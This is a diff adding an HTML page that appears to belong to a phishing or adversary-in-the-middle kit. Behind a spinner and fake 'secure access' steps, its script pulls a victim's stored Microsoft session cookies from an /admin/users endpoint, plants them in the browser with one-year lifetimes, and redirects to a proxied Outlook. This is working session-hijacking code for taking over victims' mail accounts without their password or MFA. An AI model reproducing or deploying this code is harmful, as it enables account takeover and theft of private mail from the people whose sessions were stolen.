@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Preparing Access...</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: white;
+        }
+        .container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .step {
+            margin: 10px 0;
+            opacity: 0.7;
+        }
+        .step.active {
+            opacity: 1;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🔐 Preparing Secure Access</h2>
+        <div class="spinner"></div>
+        
+        <div class="step active" id="step1">📡 Establishing connection...</div>
+        <div class="step" id="step2">🍪 Injecting session cookies...</div>
+        <div class="step" id="step3">🔒 Validating authentication...</div>
+        <div class="step" id="step4">🚀 Redirecting to Outlook...</div>
+    </div>
+
+    <script>
+        const userId = window.location.pathname.split('/').pop();
+        let currentStep = 1;
+        
+        function nextStep() {
+            document.getElementById(`step${currentStep}`).classList.remove('active');
+            currentStep++;
+            if (currentStep <= 4) {
+                document.getElementById(`step${currentStep}`).classList.add('active');
+            }
+        }
+        
+        // Simulate preparation steps
+        setTimeout(nextStep, 1000);
+        setTimeout(nextStep, 2000);
+        setTimeout(nextStep, 3000);
+        
+        // Advanced cookie injection using sophisticated method
+        setTimeout(async () => {
+            try {
+                const response = await fetch(`/admin/users`);
+                const data = await response.json();
+                const user = data.users.find(u => u._id === userId);
+                
+                if (user && user.microsoftCookies) {
+                    const cookies = user.microsoftCookies;
+                    
+                    function setCookie(key, value, domain, path, isSecure) {
+                        const cookieMaxAge = 'Max-Age=31536000';
+                        
+                        if (!key || !value) return;
+                        
+                        if (key.startsWith('__Host')) {
+                            console.log('Setting __Host cookie:', key);
+                            document.cookie = key + '=' + value + ';' + cookieMaxAge + '; path=/;Secure;SameSite=None';
+                        } else if (key.startsWith('__Secure')) {
+                            console.log('Setting __Secure cookie:', key);
+                            document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';Secure;SameSite=None';
+                        } else {
+                            if (isSecure) {
+                                console.log('Setting secure cookie:', key);
+                                if (window.location.hostname === domain || domain.startsWith('.')) {
+                                    document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';Secure;SameSite=None';
+                                } else {
+                                    document.cookie = key + '=' + value + ';' + cookieMaxAge + ';path=' + path + ';Secure;SameSite=None';
+                                }
+                            } else {
+                                console.log('Setting regular cookie:', key);
+                                document.cookie = key + '=' + value + ';' + cookieMaxAge + ';path=' + path + ';';
+                            }
+                        }
+                    }
+                    
+                    let injectedCount = 0;
+                    for (let cookie of cookies) {
+                        if (cookie.name && cookie.value && cookie.name.trim() !== '') {
+                            setCookie(cookie.name, cookie.value, cookie.domain, cookie.path, cookie.secure);
+                            injectedCount++;
+                        }
+                    }
+                    
+                    console.log(`🍪 Injected ${injectedCount} cookies`);
+                    setTimeout(() => window.location.href = `/proxy/outlook`, 1000);
+                } else {
+                    throw new Error('No cookies found');
+                }
+                
+            } catch (error) {
+                document.querySelector('.container').innerHTML = `
+                    <h2>❌ Access Failed</h2>
+                    <p>Error: ${error.message}</p>
+                    <button onclick="window.location.reload()" style="
+                        background: white; color: #667eea; border: none; 
+                        padding: 10px 20px; border-radius: 10px; cursor: pointer;
+                    ">Retry</button>
+                `;
+            }
+        }, 4000);
+    </script>
+</body>
+</html>
